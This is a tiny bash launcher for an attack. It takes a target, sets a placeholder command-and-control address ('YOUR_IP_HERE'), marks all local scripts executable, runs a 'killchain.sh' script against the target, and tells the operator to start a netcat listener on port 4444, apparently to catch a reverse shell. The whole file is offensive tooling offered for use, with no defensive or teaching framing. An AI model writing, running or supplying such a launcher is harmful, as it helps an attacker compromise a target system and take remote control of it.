#!/bin/bash
TARGET=${1:?}
C2="YOUR_IP_HERE"

chmod +x *.sh *.py
./killchain.sh $TARGET $C2
echo "[+] Full killchain deployed. Monitor: nc -lvnp 4444"